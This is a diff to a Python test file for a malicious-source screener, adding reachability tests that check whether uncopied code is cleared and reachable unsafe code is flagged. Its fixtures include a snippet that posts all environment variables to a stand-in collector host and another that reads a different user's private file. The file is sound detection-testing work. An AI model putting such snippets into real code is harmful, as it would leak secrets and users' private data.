@@ -24,7 +24,6 @@ from ditto_screener.source_review import (
     OpenRouterSourceReviewAgent,
     TarSourceRepository,
     ledger_disposition,
-    substantiated_concern_count,
 )
 from ditto_screener.source_signals import (
     find_decisive_malicious_source,
@@ -36,6 +35,7 @@ from ditto_screening_protocol import (
     SourceReviewInvariant,
     SourceReviewInvariantDisposition,
 )
+from ditto_screening_protocol.review_ledger import substantiated_concern_count
 
 _SHA = "ab" * 32
 
@@ -1934,6 +1934,12 @@ def test_static_preflight_v2_sanitized_regression_corpus(
     assert audit[0]["candidate_revision"] == "static-malicious-preflight-v2"
     expected = case["expected"]
     category = case["category"]
+    if "reachability" in case:
+        assert any(
+            proof["category"] == category
+            and proof["reachability_state"] == case["reachability"]
+            for proof in audit[0]["proofs"]
+        )
     if expected == "decisive":
         assert observation is not None
         assert observation.finding is not None
@@ -1942,6 +1948,11 @@ def test_static_preflight_v2_sanitized_regression_corpus(
         )
         assert category in observation.categories
         assert audit[0]["candidate_decisive"] is True
+    elif expected == "none":
+        assert observation is None
+        assert audit[0]["legacy_decisive"] is False
+        assert audit[0]["candidate_decisive"] is False
+        assert audit[0]["advisory_count"] == 0
     elif audit[0]["legacy_requires_serial_review"]:
         assert observation is not None
         assert observation.finding is not None
@@ -1955,11 +1966,13 @@ def test_static_preflight_v2_sanitized_regression_corpus(
         assert int(audit[0]["advisory_count"]) >= 1
 
 
-def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
+def test_static_preflight_off_retains_legacy_default_for_copied_source(
+    tmp_path: Path,
+) -> None:
     archive = _archive_files(
         tmp_path,
         {
-            "Dockerfile": b"FROM scratch\n",
+            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
             "src/main.rs": (
                 b'let endpoint = "/var/run/docker.sock";\n'
                 b"connect_control_socket(endpoint);\n"
@@ -1981,7 +1994,7 @@ def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
     )
 
 
-def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
+def test_static_preflight_shadow_clears_proven_excluded_helper_and_records_delta(
     tmp_path: Path,
 ) -> None:
     archive = _archive_files(
@@ -2006,19 +2019,122 @@ def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
         audit_recorder=audit.append,
     )
 
-    assert observation is not None
-    assert observation.finding is not None
-    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert observation is None
     assert audit == [
         {
             **audit[0],
             "mode": "shadow",
-            "legacy_decisive": True,
+            "legacy_decisive": False,
             "candidate_decisive": False,
         }
     ]
     assert audit[0]["advisory_count"] == 1
     assert audit[0]["proofs"][0]["reachability_state"] == "proven_inert"
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_uncopied_rehearsal_after_secret_mount(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM rust:bookworm AS builder\nWORKDIR /app\n"
+                b"COPY Cargo.toml ./\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"COPY src ./src\nCOPY fixtures ./fixtures\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"FROM debian:bookworm-slim\n"
+                b"COPY --from=builder /app/target/release/miner /usr/local/bin/miner\n"
+                b"COPY fixtures ./fixtures\n"
+                b'ENTRYPOINT ["miner"]\n'
+            ),
+            "Cargo.toml": b'[package]\nname="miner"\nversion="0.1.0"\n',
+            "src/main.rs": b"fn main() {}\n",
+            "fixtures/model.bin": b"\x00\xff",
+            "scripts/local-rehearsal.py": (
+                b"import os, urllib.request\n"
+                b"with urllib.request.urlopen(\n"
+                b"    'https://example.invalid/public.json'\n"
+                b") as response:\n"
+                b"    dataset = response.read()\n"
+                b"environment = os.environ.copy()\n"
+                b"environment.pop('OPENROUTER_API_KEY', None)\n"
+            ),
+        },
+    )
+    repository = TarSourceRepository(str(archive))
+    assert repository.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_inference_url_and_read_timeout(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app /app/app\n"
+                b'ENTRYPOINT ["python", "/app/app/main.py"]\n'
+            ),
+            "app/main.py": (
+                b"from app.config import Settings\nprint(Settings.from_env())\n"
+            ),
+            "app/config.py": (
+                b"import os\nclass Settings:\n"
+                b"    @classmethod\n    def from_env(cls):\n"
+                b"        inference_url = os.environ.get(\n"
+                b"            'DITTOBENCH_INFERENCE_BASE_URL', 'http://host.docker.internal:11435/v1'\n"
+                b"        )\n"
+                b"        read_seconds = 120\n"
+                b"        return inference_url, read_seconds\n"
+            ),
+        },
+    )
+    assert (
+        TarSourceRepository(str(archive)).malicious_preflight(
+            artifact_sha256="a" * 64, mode=mode
+        )
+        is None
+    )
+
+
+@pytest.mark.parametrize(
+    ("category", "source"),
+    [
+        (
+            "data_exfiltration",
+            b"import os, requests\npayload = os.environ.copy()\n"
+            b"requests.post('https://collector.invalid/report', json=payload)\n",
+        ),
+        (
+            "cross_user_access",
+            b"path = '/home/another-user/private.txt'\n"
+            b"with open(path) as source:\n    print(source.read())\n",
+        ),
+    ],
+)
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_retains_reachable_unsafe_source(
+    tmp_path: Path, mode: str, category: str, source: bytes
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": source,
+        },
+    )
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64, mode=mode
+    )
+    assert observation is not None
+    assert category in observation.categories
 
 
 def test_static_preflight_enforce_routes_unresolved_v1_threat_to_serial_review(
